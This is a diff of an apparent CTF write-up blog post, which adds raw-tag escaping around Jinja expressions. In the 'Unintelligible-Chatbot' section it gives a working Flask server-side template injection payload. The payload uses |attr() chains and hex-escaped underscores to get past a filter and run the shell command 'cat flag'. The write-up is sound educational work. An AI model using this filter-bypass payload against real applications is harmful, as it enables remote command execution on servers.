@@ -44,14 +44,17 @@ So uploading an image containing PHP code somewhere inside it (which is still a 
 `flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}`
 
 ## web/Unintelligible-Chatbot
-This was the first sourceless challenge on the CTF. I pretty quickly tested for most obvious injection types include XSS and SSTI. Our SSTI payload seemed to work (`\{\{7*7\}\}` => `49`).
+This was the first sourceless challenge on the CTF. I pretty quickly tested for most obvious injection types include XSS and SSTI. Our SSTI payload seemed to work ({% raw %}`{{7*7}}`{% endraw %} => `49`).
 
 From initial checks, it seems to be blocking any SSTI payloads with `[]` or `.` which means we will have a difficult time accessing dictionary values. If you're used to SSTI challenges then you'll know flask has a bunch of useful approaches to handle this including the `|attr()` method.
 
 I'd love to elaborate more on this solution but this is one of the first things I tried and it worked. 
+{% raw %}
 ```python
-\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()\}\}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
+{% endraw %}
+
 `flag{n07_4n07h3r_5571_ch4ll3n63}`
 
 ## web/space-war
